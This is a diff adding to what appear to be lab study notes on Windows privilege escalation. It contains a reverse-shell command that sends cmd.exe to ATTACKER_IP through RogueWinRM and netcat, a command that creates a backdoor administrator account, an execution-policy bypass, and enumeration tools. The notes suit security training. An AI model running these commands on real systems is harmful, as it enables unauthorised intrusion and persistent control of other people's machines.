@@ -250,19 +250,83 @@ Proceed to click on the "Ease of Access" button
 
 ## SeImpersonate / SeAssignPrimaryToken
 
+Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
+```powershell
+user@attackerpc$ nc -lvp 4442
+```
+
+And then, use our web shell to trigger the RogueWinRM exploit using the following command:
+```powershell
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+
+## Unpatched Software
+
+wmic tool 
+```powershell
+wmic product get name,version,vendor
+```
+
+Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.
+
+```powershell
+whoami
+```
+
+```powershell
+net user pwnd
+```
+
+```powershell
+net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
+```
 
 
+## WinPEAS
+
+WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+```powershell
+winpeas.exe > outputfile.txt
+```
+
+## PrivescCheck
+
+PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck)
+
+**Reminder**: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope process -Force PS C:\> . .\PrivescCheck.ps1 PS C:\> Invoke-PrivescCheck
+````
+
+## WES-NG: Windows Exploit Suggester - Next Generation
+
+WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng)
+
+Once installed, and before using it, type the `wes.py --update` command to update the database.
+
+To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
+
+Once this is done, wes.py can be run as follows;
+
+Kali Linux
+
+```shell
+wes.py systeminfo.txt
+```
+
+## Metasploit
+
+If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
 
 
+-   [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+-   [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+-   [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+-   [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+-   [Decoder's Blog](https://decoder.cloud/)
+-   [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+-   [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
 
 
-
-
-
-
-
-
-
-
-
-
+#win #priv
